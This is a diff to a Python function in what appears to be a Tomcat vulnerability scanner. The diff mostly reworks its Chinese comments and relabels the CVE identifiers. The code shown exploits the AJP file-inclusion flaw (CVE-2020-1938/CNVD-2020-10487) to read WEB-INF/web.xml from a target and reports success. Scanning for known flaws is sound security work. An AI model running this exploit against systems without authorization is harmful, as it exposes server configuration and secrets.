@@ -431,14 +431,16 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
                 logger.warning(
                     f"{Fore.GREEN}[-] 失败: CVE-2017-12615 漏洞利用方式{idx + 1} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{method_url} {Style.RESET_ALL}")
 
-        # 2. 检测CNVD-2020-10487漏洞 (AJP协议漏洞本地文件包含)
+        # 2. 检测漏洞 (AJP协议漏洞本地文件包含)
         try:
-            parsed_url = urlparse(url)  # 解析 URL 并提取主机名
-            target_host = parsed_url.hostname  # 自动去掉端口号
-            # 从配置文件中读取 CNVD-2020-10487 的 AJP 端口、文件路径和判断条件
+            # 解析 URL 并提取主机名
+            parsed_url = urlparse(url)
+            # 自动去掉端口号
+            target_host = parsed_url.hostname
+            # 从配置文件中读取 Tomcat 的 AJP 端口、文件路径和判断条件
             target_port = config['cnvd_2020_10487']['port']
             file_path = config['cnvd_2020_10487']['file_path']
-            lfi_check = config['cnvd_2020_10487']['lfi_check']  #
+            lfi_check = config['cnvd_2020_10487']['lfi_check']
 
             # 初始化Tomcat AJP连接
             t = Tomcat.Tomcat(target_host, target_port)
@@ -451,14 +453,19 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
             ])
 
             if data:
+                # 将接收到的数据解码为字符串
                 result_data = "".join([d.data.decode('utf-8') for d in data])
+                # 检查返回的数据中是否包含指定的判断条件
                 if lfi_check in result_data:
+                    # 如果包含，说明成功进行了本地文件包含
                     logger.info(
-                        f"{Fore.RED}[+] CNVD-2020-10487 本地文件包含成功: {target_host}:{target_port} {Style.RESET_ALL}")
-                    return True, "CNVD-2020-10487", f"ajp://{target_host}:{target_port}/WEB-INF/web.xml"  # 返回漏洞类型和URL
+                        f"{Fore.RED}[+] CVE-2020-1938/CNVD-2020-10487 本地文件包含成功: {target_host}:{target_port} {Style.RESET_ALL}")
+                    # 返回漏洞类型和URL
+                    return True, "CVE-2020-1938/CNVD-2020-10487", f"ajp://{target_host}:{target_port}/WEB-INF/web.xml"
         except Exception as e:
+            # 如果发生异常，记录失败信息
             logger.warning(
-                f"{Fore.GREEN}[-] 失败: CNVD-2020-10487 {Fore.BLUE}{url} {Fore.YELLOW}{str(e)} {Style.RESET_ALL}")
+                f"{Fore.GREEN}[-] 失败: CVE-2020-1938/CNVD-2020-10487 {Fore.BLUE}{url} {Fore.YELLOW}{str(e)} {Style.RESET_ALL}")
 
         return False, None, None  # 如果两个漏洞都未被利用成功，返回默认的失败值
 
